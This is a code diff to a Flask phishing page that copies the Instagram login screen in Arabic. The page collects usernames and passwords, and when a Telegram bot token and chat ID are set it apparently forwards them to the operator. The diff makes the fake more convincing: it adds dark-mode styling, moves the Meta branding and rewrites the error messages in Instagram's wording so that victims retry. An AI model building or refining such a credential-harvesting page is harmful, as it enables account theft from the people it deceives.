@@ -20,16 +20,17 @@ def login():
     username_val = request.form.get("username", "").strip()
     password = request.form.get("password", "")
 
-    # شرط اليوزر: حروف إنجليزية (صغيرة أو كبيرة)، أرقام، نقاط، أو شرطة سفلى، وبطول 4 أحرف على الأقل
     username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
 
     if not re.match(username_pattern, username_val):
       error = (
-          "عذراً، يجب أن يتكون اسم المستخدم من 4 أحرف أو أرقام إنجليزية على الأقل"
-          " (بدون مسافات أو رموز عربية)."
+          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
+          " اسم المستخدم ومحاولة مرة أخرى."
       )
     elif len(password) <= 5:
-      error = "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
+      error = (
+          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
+      )
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
@@ -51,15 +52,43 @@ def login():
     <title>تسجيل الدخول • Instagram</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: space-between; align-items: center; }
         
-        .main-container { width: 100%; max-width: 350px; padding: 20px; display: flex; flex-direction: column; justify-content: center; flex-grow: 1; text-align: center; }
+        /* الوضع الليلي الحقيقي تماماً مثل الصورة */
+        body { 
+            background: #000000; 
+            color: #f5f5f5;
+            width: 100vw; 
+            height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+            align-items: center; 
+        }
+        
+        .main-container { 
+            width: 100%; 
+            max-width: 350px; 
+            padding: 20px; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            flex-grow: 1; 
+            text-align: center; 
+        }
+
+        .lang-text {
+            color: #a8a8a8;
+            font-size: 12px;
+            margin-bottom: 25px;
+        }
 
         .insta-icon-container {
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             display: flex;
             justify-content: center;
         }
+        
+        /* شعار انستغرام المتدرج بدقة */
         .insta-icon {
             width: 75px;
             height: 75px;
@@ -68,7 +97,6 @@ def login():
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
         }
         .insta-icon svg {
             width: 44px;
@@ -76,32 +104,88 @@ def login():
             fill: white;
         }
 
-        .error-msg { color: #ed4956; font-size: 13px; line-height: 16px; margin-bottom: 15px; text-align: center; font-weight: 500; background: #fce8e6; padding: 10px; border-radius: 4px; border: 1px solid #fad2cf; }
-
-        .input-group { margin-bottom: 8px; }
-        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px; padding: 14px 12px; font-size: 14px; color: #262626; outline: none; }
-        .input-group input:focus { border-color: #a8a8a8; }
-
-        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 25px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; margin-bottom: 15px; }
-        .submit-btn:hover { background: #1877f2; }
-
-        .forgot-pass { color: #00376b; font-size: 13px; text-decoration: none; display: block; margin-top: 15px; font-weight: 500; }
-
-        .footer-section { width: 100%; padding-bottom: 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
-        
-        .meta-footer { margin-bottom: 15px; display: flex; align-items: center; justify-content: center; }
-        .meta-brand {
-            font-size: 15px;
-            font-weight: 600;
-            color: #737373;
-            letter-spacing: 0.5px;
+        .error-msg { 
+            color: #ed4956; 
+            font-size: 13px; 
+            line-height: 18px; 
+            margin-bottom: 15px; 
+            text-align: center; 
+            font-weight: 400; 
+            background: #1c1c1c; 
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid #331a1a; 
         }
 
-        .signup-card { padding: 12px; width: 90%; max-width: 350px; border: 1px solid #dbdbdb; border-radius: 25px; text-align: center; font-size: 14px; color: #0095f6; font-weight: 650; cursor: pointer; }
+        .input-group { margin-bottom: 6px; }
+        
+        /* تصميم الحقول الداكنة الخاصة بالوضع الليلي */
+        .input-group input { 
+            width: 100%; 
+            background: #121212; 
+            border: 1px solid #262626; 
+            border-radius: 8px; 
+            padding: 14px 12px; 
+            font-size: 14px; 
+            color: #f5f5f5; 
+            outline: none; 
+        }
+        .input-group input:focus { border-color: #a8a8a8; }
+        .input-group input::placeholder { color: #8e8e8e; }
+
+        .submit-btn { 
+            width: 100%; 
+            background: #0095f6; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            padding: 12px; 
+            font-size: 14px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: 10px; 
+            margin-bottom: 15px; 
+        }
+        .submit-btn:hover { background: #1877f2; }
+
+        .forgot-pass { color: #f5f5f5; font-size: 13px; text-decoration: none; display: block; margin-top: 10px; font-weight: 400; }
+
+        .footer-section { 
+            width: 100%; 
+            padding-bottom: 25px; 
+            text-align: center; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+        }
+        
+        .signup-card { 
+            padding: 12px; 
+            width: 90%; 
+            max-width: 350px; 
+            border: 1px solid #262626; 
+            border-radius: 8px; 
+            text-align: center; 
+            font-size: 14px; 
+            color: #0095f6; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-bottom: 20px;
+        }
+
+        .meta-footer { display: flex; align-items: center; justify-content: center; }
+        .meta-brand {
+            font-size: 14px;
+            font-weight: 600;
+            color: #737373;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
     <div class="main-container">
+        <div class="lang-text">العربية</div>
+        
         <div class="insta-icon-container">
             <div class="insta-icon">
                 <svg viewBox="0 0 24 24">
@@ -128,11 +212,11 @@ def login():
     </div>
 
     <div class="footer-section">
-        <div class="meta-footer">
-            <div class="meta-brand">Meta</div>
-        </div>
         <div class="signup-card">
             إنشاء حساب جديد
+        </div>
+        <div class="meta-footer">
+            <div class="meta-brand">∞ Meta</div>
         </div>
     </div>
 </body>
